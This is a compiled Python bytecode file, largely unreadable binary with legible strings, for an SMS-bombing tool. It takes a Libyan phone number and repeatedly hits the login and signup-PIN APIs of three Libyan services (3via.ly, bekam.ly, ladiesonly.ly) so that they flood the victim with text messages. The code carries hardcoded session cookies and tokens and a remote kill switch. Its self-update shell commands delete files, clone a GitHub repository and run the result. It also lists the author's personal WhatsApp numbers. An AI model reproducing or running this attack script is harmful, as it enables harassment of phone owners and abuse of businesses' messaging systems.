o
    �F�b4)  �                   @   sX  d dl Z e �d� e �d� e �d� z
d dlZd dlZW n   e �d� e �d� Y d dlZd dlZe �d� d dlmZ d dlmZ d d	lm	Z
 ze �d
� e �d� W n   dZY zed� W n   eejd ej � e �d� e�  Y dZdd� Zdd� Zdd� Zdd� Zdd� Zdd� Zdd� Zdd� Zeejd  ej � e�  dS )!�    Nzpkg install pythonzpkg install git�clearzpip install requestszpip install colorama)�Fore)�Back)�sleepzrm -rf system25zHamed Emtir Program�he.py�"[!] The File Name Have To Be he.py�exit�   c                  C   s�   zt d� W n   ttjd tj � t�d� t�  Y td�} t�d� | �	� dks8| �	� dks8| �	� dkr=t
�  d S t�  d S )	Nr   r   r   zDo You Wanna Start Again(y/n):r   �y�yes�yeas)�open�print�f�RED�RESET�os�systemr   �input�lower�ch)Zagg� r   �ladis.py�again   s   

$

r   c                  C   s  ddt tj�d�} ddd�}d}|tjkryzPt�� �B}d}|j|| |d�}|jd	krDtt	j
d
 t |� d tj d t	j � |d7 }ntt	jd t |j� d t	j � W d   � n1 s_w   Y  W n   tt	jd t	j � Y |tjkstd� t�  d S )NzfMozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36aH  eyJpdiI6IlI1VjN1alRDWkdOUklxYmZ2b2pEZnc9PSIsInZhbHVlIjoiMW04VmNhL3k0dm9obWI2eFlEcWR5dXl4WC9iZWEwYm5WT2hCRXB1cnBhWHlJRTdxd3ZTY3o1SFZvTktDSUlab1NLNWwxQUpGMXk5ZjVsUUFZSC8rbFBSc0ZPNzJRNU1QakdDZkNtQlpSblo5Nk9jV0xvVUM3UzhTRW55NnNtbDQiLCJtYWMiOiIwOTM3YjEwNjJiNzczOWNlMmU2NzFiM2EzNWFjZjMyNDk5YWNlNzZiMWZlMTE4NzM4MTRlOTY0MDgzMjBmZTUyIn0=)�
user-agentzx-xsrf-token�msisdnz�sb=LNJ6YHMf7R4J52zOY4KX8dRo; datr=LNJ6YOgUw5u3fRZDyZu7Ct04; fr=06dJEEiQuC0C33kXQ.AWVUuT4ZtCQUw7pgrbLhw431YWY.Bic7x-.Xf.AAA.0.0.BigCvz.AWV5WPOw-fY)r   �cookier	   z$https://www.3via.ly/api/client/login��dataZheaders��   �=> Succecful Send [�] Messages For [�] Number Phone.�"Error, There is Something Wrong! [�]�[!] InterNet Connection Error.�2   ـــــــــــــــــــــــــ)�str�start2�num�fn�requests�Session�post�status_coder   r   �GREENr   r   r   �r   Zlogin�i�sZloginurl�rr   r   r   �work2*   s2   ��


*
"���
�
r4   c                  C   s  zxt td��} dt| � t_tjd dkstjd dkrjz;tjd }ttj�dkr/tjd }n'zt td	��t_t td
��t_ttj� W n   t	t
jd t
j � t�  Y W n   t	t
jd t
j � t�  Y nt	t
jd t
j � t�  W n   t	t
jd t
j � t�  Y t�  d S )N�=> Number Start with 092/094: �0�   �2�4�	   �
   �   �;��=> How many: �=> How Many Seconds: �Please Write Number Not String.z&Please Write it Correct of 10 Numbers.z1Please Makesure OF THe Number, Start With 092/094)�intr   r'   r(   r)   �lenr*   �ti�spr   r   r   r   r4   �r)   �gr   r   r   r(   C   s4   
�
�
r(   c                  C   s�   dt tj�i} ddi}d}|tjkrvzPt�� �B}d}|j|| |d�}|jdkrAtt	j
d t |� d	 tj d
 t	j � |d7 }ntt	jd t |j� d t	j � W d   � n1 s\w   Y  W n   tt	jd t	j � Y |tjkstd� t�  d S )Nr   r   a  _ga_D6L8MEFM2M=GS1.1.1623799548.6.1.1623799571.37; _ga=GA1.1.185305656.1618662169; XSRF-TOKEN=eyJpdiI6Ijl1bmhFbzRKcFJZbExnUnhkd0ZUemc9PSIsInZhbHVlIjoiQzNGN0E1QjR2aVMvaFV4N0p0cDRldTQ5ZVZwT3lMdTJWSTlreElMc3BHTWRlQXMxQmFWVFdJckxkaHFlWVFWdmRibEJJdXhWbGwvUTJQL21XQ2NWY1cwa1JTQ0M4QkV0S0ZWMnVZY0JqUUY4QlUzQXNmMFFYeHJaKzhBM1FqajQiLCJtYWMiOiIwMzIxNjRhMjIwZmIzYmM3NTgwMDg2MmE5ZmY5NzIzZDUwNmM5Yjk3ODkwNWQwMDVmYWIyNWUxMmIzZDU2ZmYyIn0%3D; laravel_session=eyJpdiI6IkRSQVVERkhlSW53ZEZoVlZlYURZb3c9PSIsInZhbHVlIjoiYTJhL1Z1RnpOMWR3S0ZUM1RKVmxReTRvRDBDUTVqT2ZJak9CYlFNQi90bWVvQ2VmMnpWcVAyeEFXajdjSWE2NFlINlo1VEpZWW5aR2FuYk5GWDRpd2ZydGNPOTVrc1dBU2xoSG83SXpzc2hZZExybU81TGNOdFV3VXhKUkNuVlUiLCJtYWMiOiJiMzY3M2YzYWQ4NjdhMjY2MDY4MjVkNzFmYWFhYzcxNGYzZWZmYTViZTZiN2Y1NjYyZjQxMjIxNmJkZWRiNDYwIn0%3Dr	   z%https://www.bekam.ly/api/client/loginr   r   r    r!   r"   r#   r$   r%   r&   )r'   �start1r)   r*   r+   r,   r-   r.   r   r   r/   r   r   r   r0   r   r   r   �work1_   s,   
��


*
"���	
�
rG   c                  C   s,  zt td��} dt| � t_tjd dks#tjd dks#tjd dkrqz;tjd }ttj�dkr6tjd	 }n'zt td
��t_t td��t_t	tj� W n   t
tjd tj � t�  Y W n   t
tjd tj � t�  Y nt
tjd tj � t�  W n   t
tjd tj � t�  Y t�  d S )Nz"=> Number Start with 092/094/091: r6   r7   r8   r9   �1r:   r;   r<   r=   r>   �#[!] Please Write Number Not String.�*[!] Please Write it Correct of 10 Numbers.�5[!] Please Makesure OF THe Number, Start With 092/094)r@   r   r'   rF   r)   rA   �startr*   rB   rC   r   r   r   r   rG   rD   r   r   r   rF   v   s4   *
�
�
rF   c                  C   s  i } dt j dd�}d}|t jkrxzSt�� �E}dt j }|j|| |d�}|jdkrCttj	d t
|� d	 t j d
 tj � |d7 }nttjd t
|j� d tj � W d   � n1 s^w   Y  W n   ttjd tj � Y |t jkstd� t�  d S )Nz
msisdn=218a-  connect.sid=s%3A9cOkNfTJvjdG1wlzWmPI4bxqZt-WPD9A.M%2FU7Wf5zvzJZtOtgdT6AVrriHFfMNZlQLIoa2w0Qs1s; _gcl_au=1.1.947751156.1653401462; _gid=GA1.2.427065461.1653401463; _gat_UA-149696240-1=1; _fbp=fb.1.1653401463464.205457740; _ga_34YG2J65QJ=GS1.1.1653401462.1.1.1653401464.0; _ga=GA1.2.694333947.1629036561)z
Set-CookieZCookier	   z#http://ladiesonly.ly/signup_pin/218r   r   r    r!   r"   r#   r$   r%   r&   )rL   r)   r*   r+   r,   r-   r.   r   r   r/   r'   r   r   r   r0   r   r   r   �work�   s,   �



*
"���	
�
rM   c                  C   s  zvt td��} t| �t_tjd dkstjd dkrhz;tjd }ttj�dkr-tjd }n'zt td��t_t td	��t_ttj� W n   t	t
jd
 t
j � t�  Y W n   t	t
jd t
j � t�  Y nt	t
jd t
j � t�  W n   t	t
jd t
j � t�  Y t�  d S )Nr5   r	   r8   r9   �   r:   r<   r=   r>   rI   rJ   rK   r?   )r@   r   r'   rL   r)   rA   r*   rB   rC   r   r   r   r   rM   rD   r   r   r   rL   �   s4   

�
�
rL   c                  C   s�  zt t�d�j�} | | �d�d  }W n   ttjd tj � t	�  Y t |�dkr>ttjd � t
�d� t
�d� d S t |�t t�kr�ttjd	 t t� d
 tj � tdt t� d
 � td� tdtj � td� ttjd tj �}|�� dks�|�� dks�|�� dkr�t
�d� t
�d� t
�d� t
�d� t
�d� t
�d� t
�d� t
�d� d S t
�d� t�  d S t |�t t�k�rZttjtj d tj t t� d tj tj � ttjtj d d d tj tj � td� td � td!� td"� zttd#��}W n   ttjd$ tj � t
�d� t	�  Y |d%k�r.t�  d S |d&k�r8t�  d S |d'k�rBt�  d S ttjd( tj � td'� t
�d� t	�  d S d S ))Nz9https://hamedemtir.blogspot.com/2022/05/blog-post_25.htmlZ
HamedEmtirr;   r%   r6   z8[!] Sorry This Program Was Stopped By Admin[Hamed Emtir]zrm he.pyr   z[!] New Version Update[r$   z    Your Version Now is [z    Contact Me On WHATSAPP:z"    +218945961893 or +218911684844� z$==> Do You wanna Download it (y/n): r
   r   r   zmkdir system25zmv he.py system25z	cd /$HOMEz:git clone https://github.com/MedoEmtir/hamed_emtir.sms.gitzmv hamed_emtir.sms/he.py $HOMEzrm -rf hamed_emtir.smsr   zpython3 /$HOME/he.pyz    Version[z].z====> WelCome To <zHamed Emtirz> Program. [CHOOSE THE SERVER]:z[1]3ivaz[2]Bekamz	[3]LadieszYou Choosed: z+[!] Try Again, And Write Number Not String!r	   r7   �   z0[!] Please Choose The Right Number: 1 or 2 or 3.)r'   r+   �get�content�findr   r   r   r   r   r   r   �v�br   �YELLOWr   r   r/   ZBLACKZBLUEr@   r(   rF   rL   rC   )�cZffZaskZvvr   r   r   r   �   sh   
 $








2(








�r   zCheaking For Update ..)r   r   r+   Zcoloramar   r   r   rU   �timer   rC   Zgggggggggggr   r   r   r   r   rT   r   r4   r(   rG   rF   rM   rL   r   rV   r   r   r   r   �<module>   sL    






6
